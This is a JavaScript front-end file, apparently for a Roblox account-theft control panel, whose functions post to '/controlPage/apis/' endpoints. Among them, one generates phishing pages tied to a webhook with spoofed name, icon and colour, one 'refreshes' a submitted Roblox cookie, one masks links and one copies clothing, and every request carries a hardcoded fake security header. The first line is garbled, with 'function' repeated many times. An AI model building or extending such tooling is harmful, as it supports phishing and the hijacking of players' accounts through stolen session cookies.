functionfunctionfunctionfunctionfunctionfunctionfunctionfunction Create(a, b, c) {
    var directory = document.getElementById("directory").value;
    var Webhook = document.getElementById("Webhook").value;
    var type = document.getElementById("type").value;

    if (!directory || !Webhook || !type) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }
    let url;

    if (type === 'quadhook') {
        var sname = document.querySelector('input[name="sname"]').value;
        var sicon = document.querySelector('input[name="sicon"]').value;
        var scolor = document.querySelector('input[name="scolor"]').value;

        if (!sname || !sicon || !scolor) {
            Swal.fire('Error', 'You must fill out the form.', 'error');
            return;
        }

        url = `/controlPage/apis/create?a=${encodeURIComponent(directory)}&b=${encodeURIComponent(Webhook)}&c=${encodeURIComponent(type)}&d=${encodeURIComponent(sname)}&e=${encodeURIComponent(sicon)}&f=${encodeURIComponent(scolor)}`;
    } else {
        url = `/controlPage/apis/create?a=${encodeURIComponent(directory)}&b=${encodeURIComponent(Webhook)}&c=${encodeURIComponent(type)}`;
    }
    $.ajax({
        url: url,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "Generate";
        },
        success: function(data) {
            if (data['success'] === true) {
                Swal.fire('Good Job!', 'Check Your Webhook', 'success');
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}

function CC(a, b) {
    var code = document.getElementById("code").value;
    var pin = document.getElementById("pin").value;

    if (!code || !pin) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }

    $.ajax({
        url: '/controlPage/apis/cc',
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        data: JSON.stringify({
            a: code,
            b: pin
        }),
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "Copy Clothing!";
        },
        success: function(data) {
            if (data['success'] === true) {
                window.location.replace("/template");
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}

function FB(a, b) {
    var code = document.getElementById("code").value;
    var pin = document.getElementById("pin").value;

    if (!code || !pin) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }

    $.ajax({
        url: '/controlPage/apis/fb',
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        data: JSON.stringify({
            a: code,
            b: pin
        }),
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "Try Again";
        },
        success: function(data) {
            if (data['success'] === true) {
                Swal.fire('Good Job!', 'Allow 1 - 10 Minutes For Process To Complete', 'success');
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}

function SignIn(a, b) {
    var token = document.getElementById("token").value;
    var type = document.getElementById("type").value;

    if (!token || !type) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }

    $.ajax({
        url: '/controlPage/apis/main',
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        data: JSON.stringify({
            token: token,
            type: type
        }),
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "Sign in";
        },
        success: function(data) {
            if (data['success'] === true) {
                window.location.replace("dashboard");
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}

function Update(a, b) {
    var webhook = document.getElementById("webhook").value;
    var avatar = document.getElementById("avatar_url").value;
    var name = document.getElementById("username").value;
    var gamepass = document.getElementById("gamepass").value;

    var type = 'Update';

    if (!webhook || !name || !avatar) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }

    $.ajax({
        url: '/controlPage/apis/main',
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        data: JSON.stringify({
            webhook: webhook,
            avatar: avatar,
            name: name,
            gamepass: gamepass,
            type: type
        }),
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "Save Changes";
        },
        success: function(data) {
            if (data['success'] === true) {
                Swal.fire('Good Job!', 'Data Updated Successfully', 'success');
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}

function hyperlink(a, b) {
    var link = document.getElementById("link").value;
    var type = document.getElementById("type").value;

    if (!link) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }

    $.ajax({
        url: '/controlPage/apis/main',
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        data: JSON.stringify({
            url: link,
            type: type
        }),
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "HyperLink";
        },
        success: function(data) {
            if (data['url']) {
                document.getElementById("link").value = data['url'];
                Swal.fire('Good Job!', 'Link Shortened Successfully', 'success');
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}

function refresh(a, b) {
    var cookie = document.getElementById("cookie").value;
    var type = document.getElementById("type").value;

    if (!cookie) {
        Swal.fire('Error', 'You must fill out the form.', 'error');
        return;
    }

    $.ajax({
        url: '/controlPage/apis/main',
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        data: JSON.stringify({
            cookie: cookie,
            type: type
        }),
        beforeSend: function() {
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data) {
            Swal.fire('Error', `${data.responseJSON['errors'][0]['message']}`, 'error');
        },
        complete: function() {
            a.disabled = false;
            a.innerHTML = "Refresh";
        },
        success: function(data) {
            if (data['cookie']) {
                document.getElementById("cookie").value = data['cookie'];
                Swal.fire('Good Job!', 'Cookie Successfully Refreshed', 'success');
            } else {
                Swal.fire('Error', `${data['errors'][0]['message']}`, 'error');
            }
        }
    });
}